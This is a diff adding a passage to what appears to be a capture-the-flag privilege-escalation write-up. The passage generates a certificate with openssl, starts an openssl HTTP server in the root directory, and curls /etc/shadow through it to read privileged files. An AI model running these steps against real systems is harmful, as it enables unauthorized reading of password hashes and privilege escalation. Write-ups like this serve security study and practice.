@@ -106,3 +106,18 @@ That means if you start the server from a low privileged userdirectory you will 
 8. We can switch User to root now since we created the new password!
 
 
+The command for creating a private key and a certificate with openssl is:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+
+with the nodes option you avoid giving a passphrase.
+
+Now we start the server in the root directory:
+
+openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
+
+Now that the server is running we can curl the resource we want!
+
+curl -k "https://127.0.0.1:1337/etc/shadow" ( We could also just curl the root.txt :D )
+
+
+
